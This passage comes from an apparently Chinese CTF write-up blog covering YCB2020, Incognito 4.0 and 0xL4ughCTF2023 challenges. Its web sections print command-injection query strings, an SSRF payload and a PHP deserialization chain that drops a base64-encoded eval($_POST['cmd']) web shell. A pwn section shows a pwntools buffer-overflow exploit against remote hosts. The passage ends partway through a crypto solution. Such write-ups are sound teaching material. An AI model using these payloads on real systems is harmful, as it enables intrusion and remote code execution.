class="hljs-comment">//83a52f8ff4e399417109312e0539c80147b5514586c45a6caeb3681ad9c1a395</span><br></code></pre></td></tr></table></figure><p>这样就能命令执行了<br><code>Black-Cat-Sheriff=83a52f8ff4e399417109312e0539c80147b5514586c45a6caeb3681ad9c1a395&amp;One-ear=;dir&amp;White-cat-monitor[]=1</code><br><img src="/wp/ycb2020/8.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;;nl flag*&#x27;</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hh</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//989bea3b0fac784fdbb673336b1ba564ed81e8066de71903d3e42f47b5ff98ac</span><br></code></pre></td></tr></table></figure><p><code>Black-Cat-Sheriff=989bea3b0fac784fdbb673336b1ba564ed81e8066de71903d3e42f47b5ff98ac&amp;One-ear=;nl flag*&amp;White-cat-monitor[]=1</code><br><img src="/wp/ycb2020/9.png"></p><h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p><img src="/wp/ycb2020/10.png"><br><img src="/wp/ycb2020/11.png"><br>看源码<br><img src="/wp/ycb2020/12.png"><br>不安全指http，而不是https<br>ssrf读取文件<br><code>[http://127.0.0.1/star1.php](http://127.0.0.1/star1.php)</code><br><img src="/wp/ycb2020/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span> ) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yasuo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hero))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;hero-&gt;<span class="hljs-title function_ invoke__">hasaki</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You don&#x27;t look very happy&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$text</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; text = <span class="hljs-variable">$text</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$d</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span>= <span class="hljs-variable">$d</span>. <span class="hljs-variable language_">$this</span>-&gt;text;<br>         @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; file,<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yasuo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m the best happy windy man&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>构造反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>&#125;<br><span class="hljs-variable">$door</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GWHT</span>();<br><span class="hljs-variable">$door</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yongen</span>();<br><span class="hljs-variable">$door</span>-&gt;hero-&gt;file = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>;<br><span class="hljs-variable">$door</span>-&gt;hero-&gt;text = <span class="hljs-string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$door</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>用arjun扫参数是c<br>但是我扫不出来0.0.<br><img src="/wp/ycb2020/14.png"><br>payload：<code>path=[http://127.0.0.1/star1.php&amp;c=](http://127.0.0.1/star1.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;)O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A77%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%7Cconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A40%3A%22PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%22%3B%7D%7D</code><br><img src="/wp/ycb2020/15.png"><br><img src="/wp/ycb2020/16.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Incognito 4.0</title>
    <link href="/2023/02/20/Incognito%204.0/"/>
    <url>/2023/02/20/Incognito%204.0/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="get-flag-1"><a href="#get-flag-1" class="headerlink" title="get flag 1"></a>get flag 1</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>All you need to do is get the flag at :9001/flag.txt<br><a href="http://45.79.210.216:5000/">http://45.79.210.216:5000</a></p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>[http://0.0.0.0:9001/flag.txt](http://0.0.0.0:9001/flag.txt)</code><br><img src="/mdimg/ictf/1.png"></p><h3 id="get-flag-2"><a href="#get-flag-2" class="headerlink" title="get flag 2"></a>get flag 2</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>I have upgraded my server to make it future proof. Let’s see if you can get the flag now. Flag at :9001/flag.txt<br><a href="http://45.79.216.81:5000/">http://45.79.216.81:5000</a></p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>http://[::]:9001/flag.txt</code><br><img src="/mdimg/ictf/2.png"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="babyFlow"><a href="#babyFlow" class="headerlink" title="babyFlow"></a>babyFlow</h3><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;143.198.219.171&#x27;</span>,<span class="hljs-number">5000</span>)<br>p.recv()<br>g = (<span class="hljs-number">0x14</span>+<span class="hljs-number">4</span>)*<span class="hljs-string">&#x27;a&#x27;</span>+p32(<span class="hljs-number">0x80491fc</span>)<br>p.sendline(g)<br>p.interactive()<br><br><span class="hljs-comment">#ictf&#123;bf930bcd-6c10-4c05-bdd8-435db4b50cdb&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Gainme"><a href="#Gainme" class="headerlink" title="Gainme"></a>Gainme</h3><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p  = remote(<span class="hljs-string">&#x27;143.198.219.171&#x27;</span>,<span class="hljs-number">5003</span>)<br>p.recvline()<br>p.recvuntil(<span class="hljs-string">&#x27;Level 0:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;ICTF4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Level 1:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;dasDASQWgjtrkodsc&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Level 2:&#x27;</span>)<br>p.sendline(p64(<span class="hljs-number">0xDEADBEEF</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;Level 3:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.interactive()<br><br><span class="hljs-comment">#ictf&#123;g@inm3-sf23f-4fd2150cd33db&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h3><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Meow&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-built_in">print</span>(data[<span class="hljs-number">1</span>::<span class="hljs-number">2</span>].decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br><span class="hljs-comment">#ictf&#123;easiest_challenge_of_them_all&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient"><a href="#Ancient" class="headerlink" title="Ancient"></a>Ancient</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>Found an ancient image file but unable to figure out what this is. Could you help me out?</p><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>下载的图片需要手动加png文件头<br><img src="/mdimg/ictf/3.png"><br>谷歌识图<br><img src="/mdimg/ictf/4.png"><br><code>[https://jsom1.github.io/_challenges/templed](https://jsom1.github.io/_challenges/templed)</code><br>一个比赛原题<br>手动对着表转一下就行<br><img src="/mdimg/ictf/5.png"></p><h3 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    cy = f.read()<br><span class="hljs-built_in">print</span>(cy)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cy))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">f, i</span>):<br>    <span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">5</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xAD</span><br>        var1 = (out &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span><br>        var2 = <span class="hljs-number">2</span> * out &amp; <span class="hljs-number">0xAA</span><br>        <span class="hljs-keyword">return</span> var1 | var2 <br>    <span class="hljs-keyword">elif</span> i&gt;=<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> i&lt;<span class="hljs-number">10</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xBE</span><br>        var1 = (out &amp; <span class="hljs-number">0xCC</span>) &gt;&gt; <span class="hljs-number">2</span><br>        var2 = <span class="hljs-number">4</span> * out &amp; <span class="hljs-number">0xCC</span><br>        <span class="hljs-keyword">return</span> var1 | var2<br>    <span class="hljs-keyword">else</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xEF</span><br>        var1 = (out &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span><br>        var2 = <span class="hljs-number">16</span> * out &amp; <span class="hljs-number">0xF0</span><br>        <span class="hljs-keyword">return</span> var1 | var2<br><br>dic = &#123;&#125;<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        t = <span class="hljs-built_in">chr</span>(func(<span class="hljs-built_in">chr</span>(j), i))<br>        <span class="hljs-keyword">if</span> t==cy[i]:<br>            <span class="hljs-built_in">print</span>(i, <span class="hljs-built_in">chr</span>(j), j)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#ictf&#123;88f30d1cd1ab443&#125;</span><br></code></pre></td></tr></table></figure><h2 id="TheOnlyJail"><a href="#TheOnlyJail" class="headerlink" title="TheOnlyJail"></a>TheOnlyJail</h2><h3 id="TheOnlyJail-1"><a href="#TheOnlyJail-1" class="headerlink" title="TheOnlyJail"></a>TheOnlyJail</h3><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>os.system(b64.base64decode(<span class="hljs-string">&quot;some_base64_encoded_command_like_cat /home/ctf/flag.txt&quot;</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xL4ughCTF2023</title>
    <link href="/2023/02/19/0xL4ughCTF/"/>
    <url>/2023/02/19/0xL4ughCTF/</url>
    
    <content type="html"><![CDATA[<p><strong>部分附件(包含wp内所有题目)：链接：<a href="https://pan.baidu.com/s/19YZXz_T0S3ZCEbnHkdlV0g?pwd=6666">https://pan.baidu.com/s/19YZXz_T0S3ZCEbnHkdlV0g?pwd=6666</a></strong><br><strong>提取码：6666</strong></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="att-ip"><a href="#att-ip" class="headerlink" title="att ip"></a>att ip</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/1.png"><br><code>0xL4ugh&#123;91.243.59.76_23927&#125;</code></p><h3 id="PVE"><a href="#PVE" class="headerlink" title="PVE"></a>PVE</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>volatility3查看linux版本<br><code>0xL4ugh&#123;Ubuntu_4.4.0-186-generic&#125;</code></p><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h5><p><img src="/mdimg/0xl4/2.png"><br><code>0xL4ugh&#123;2.2.14&#125;</code></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p><img src="/mdimg/0xl4/3.png"><br><code>0xL4ugh&#123;S4D_Y0U_G07_M3&#125;</code></p><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p><img src="/mdimg/0xl4/4.png"><br><code>0xL4ugh&#123;H1DD3N_1N_PR0CE$$&#125;</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Bypass-Basic"><a href="#Bypass-Basic" class="headerlink" title="Bypass ( Basic )"></a>Bypass ( Basic )</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Some one reported to our Bug Bounty Program that he found a secret page that discloses some senstive information and we forbidden any access to it <a href="http://20.121.121.120/secret.php">link</a><br>Author : abdoghazy</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="http://web.archive.org/">http://web.archive.org/</a><br><img src="/mdimg/0xl4/5.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto 1"></a>Crypto 1</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Alice and Bob decided to create their own super cryptosystem. However.. it has a super flaw<br>Flag : OSC{}</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">79</span>, <span class="hljs-number">159</span>, <span class="hljs-number">317</span>, <span class="hljs-number">635</span>, <span class="hljs-number">1269</span>, <span class="hljs-number">2538</span>, <span class="hljs-number">5077</span>, <span class="hljs-number">10154</span>, <span class="hljs-number">20307</span>, <span class="hljs-number">40615</span>, <span class="hljs-number">81229</span>, <span class="hljs-number">162458</span>, <span class="hljs-number">324916</span>, <span class="hljs-number">649832</span>, <span class="hljs-number">1299665</span>, <span class="hljs-number">2599330</span>, <span class="hljs-number">5198659</span>, <span class="hljs-number">10397319</span>, <span class="hljs-number">20794638</span>, <span class="hljs-number">41589276</span>, <span class="hljs-number">83178552</span>, <span class="hljs-number">166357103</span>, <span class="hljs-number">332714207</span>, <span class="hljs-number">665428414</span>, <span class="hljs-number">1330856827</span>, <span class="hljs-number">2661713655</span>, <span class="hljs-number">5323427309</span>, <span class="hljs-number">10646854619</span>, <span class="hljs-number">21293709237</span>, <span class="hljs-number">42587418474</span>, <span class="hljs-number">85174836949</span>, <span class="hljs-number">170349673898</span>, <span class="hljs-number">340699347795</span>, <span class="hljs-number">681398695591</span>, <span class="hljs-number">1362797391181</span>, <span class="hljs-number">2725594782363</span>, <span class="hljs-number">5451189564725</span>, <span class="hljs-number">10902379129451</span>, <span class="hljs-number">21804758258901</span>, <span class="hljs-number">43609516517803</span>, <span class="hljs-number">87219033035605</span>, <span class="hljs-number">174438066071211</span>, <span class="hljs-number">348876132142421</span>, <span class="hljs-number">697752264284843</span>, <span class="hljs-number">1395504528569685</span>, <span class="hljs-number">2791009057139370</span>, <span class="hljs-number">5582018114278740</span>, <span class="hljs-number">11164036228557480</span>, <span class="hljs-number">22328072457114960</span>, <span class="hljs-number">44656144914229920</span>, <span class="hljs-number">89312289828459841</span>, <span class="hljs-number">178624579656919682</span>, <span class="hljs-number">357249159313839363</span>, <span class="hljs-number">714498318627678726</span>, <span class="hljs-number">1428996637255357453</span>, <span class="hljs-number">2857993274510714906</span>, <span class="hljs-number">5715986549021429811</span>, <span class="hljs-number">11431973098042859623</span>, <span class="hljs-number">22863946196085719246</span>, <span class="hljs-number">45727892392171438492</span>, <span class="hljs-number">91455784784342876983</span>, <span class="hljs-number">182911569568685753966</span>, <span class="hljs-number">365823139137371507933</span>, <span class="hljs-number">731646278274743015865</span>, <span class="hljs-number">1463292556549486031730</span>, <span class="hljs-number">2926585113098972063460</span>, <span class="hljs-number">5853170226197944126921</span>, <span class="hljs-number">11706340452395888253841</span>, <span class="hljs-number">23412680904791776507682</span>, <span class="hljs-number">46825361809583553015364</span>, <span class="hljs-number">93650723619167106030728</span>, <span class="hljs-number">187301447238334212061457</span>, <span class="hljs-number">374602894476668424122913</span>, <span class="hljs-number">749205788953336848245827</span>, <span class="hljs-number">1498411577906673696491653</span>, <span class="hljs-number">2996823155813347392983306</span>, <span class="hljs-number">5993646311626694785966613</span>, <span class="hljs-number">11987292623253389571933226</span>, <span class="hljs-number">23974585246506779143866452</span>, <span class="hljs-number">47949170493013558287732903</span>, <span class="hljs-number">95898340986027116575465806</span>, <span class="hljs-number">191796681972054233150931613</span>, <span class="hljs-number">383593363944108466301863225</span>, <span class="hljs-number">767186727888216932603726450</span>, <span class="hljs-number">1534373455776433865207452900</span>, <span class="hljs-number">3068746911552867730414905800</span>, <span class="hljs-number">6137493823105735460829811601</span>, <span class="hljs-number">12274987646211470921659623202</span>, <span class="hljs-number">24549975292422941843319246403</span>, <span class="hljs-number">49099950584845883686638492807</span>, <span class="hljs-number">98199901169691767373276985614</span>, <span class="hljs-number">196399802339383534746553971228</span>, <span class="hljs-number">392799604678767069493107942455</span>, <span class="hljs-number">785599209357534138986215884910</span>, <span class="hljs-number">1571198418715068277972431769821</span>, <span class="hljs-number">3142396837430136555944863539641</span>, <span class="hljs-number">6284793674860273111889727079282</span>, <span class="hljs-number">12569587349720546223779454158564</span>, <span class="hljs-number">25139174699441092447558908317129</span>, <span class="hljs-number">50278349398882184895117816634258</span>, <span class="hljs-number">100556698797764369790235633268515</span>, <span class="hljs-number">201113397595528739580471266537030</span>, <span class="hljs-number">402226795191057479160942533074061</span>, <span class="hljs-number">804453590382114958321885066148122</span>, <span class="hljs-number">1608907180764229916643770132296243</span>, <span class="hljs-number">3217814361528459833287540264592486</span>, <span class="hljs-number">6435628723056919666575080529184973</span>, <span class="hljs-number">12871257446113839333150161058369946</span>, <span class="hljs-number">25742514892227678666300322116739891</span>, <span class="hljs-number">51485029784455357332600644233479783</span>, <span class="hljs-number">102970059568910714665201288466959565</span>, <span class="hljs-number">205940119137821429330402576933919130</span>, <span class="hljs-number">411880238275642858660805153867838260</span>, <span class="hljs-number">823760476551285717321610307735676520</span>, <span class="hljs-number">1647520953102571434643220615471353041</span>, <span class="hljs-number">3295041906205142869286441230942706082</span>, <span class="hljs-number">6590083812410285738572882461885412163</span>, <span class="hljs-number">13180167624820571477145764923770824327</span>, <span class="hljs-number">26360335249641142954291529847541648653</span>, <span class="hljs-number">52720670499282285908583059695083297307</span>, <span class="hljs-number">105441340998564571817166119390166594613</span>, <span class="hljs-number">210882681997129143634332238780333189226</span>, <span class="hljs-number">421765363994258287268664477560666378453</span>, <span class="hljs-number">843530727988516574537328955121332756906</span>, <span class="hljs-number">1687061455977033149074657910242665513811</span>, <span class="hljs-number">3374122911954066298149315820485331027622</span>, <span class="hljs-number">6748245823908132596298631640970662055244</span>, <span class="hljs-number">13496491647816265192597263281941324110489</span>, <span class="hljs-number">26992983295632530385194526563882648220977</span>, <span class="hljs-number">53985966591265060770389053127765296441955</span>, <span class="hljs-number">107971933182530121540778106255530592883909</span>, <span class="hljs-number">215943866365060243081556212511061185767818</span>, <span class="hljs-number">431887732730120486163112425022122371535637</span>, <span class="hljs-number">863775465460240972326224850044244743071274</span>, <span class="hljs-number">1727550930920481944652449700088489486142548</span>, <span class="hljs-number">3455101861840963889304899400176978972285095</span>, <span class="hljs-number">6910203723681927778609798800353957944570190</span>, <span class="hljs-number">13820407447363855557219597600707915889140381</span>, <span class="hljs-number">27640814894727711114439195201415831778280761</span>, <span class="hljs-number">55281629789455422228878390402831663556561522</span>, <span class="hljs-number">110563259578910844457756780805663327113123044</span>, <span class="hljs-number">221126519157821688915513561611326654226246089</span>, <span 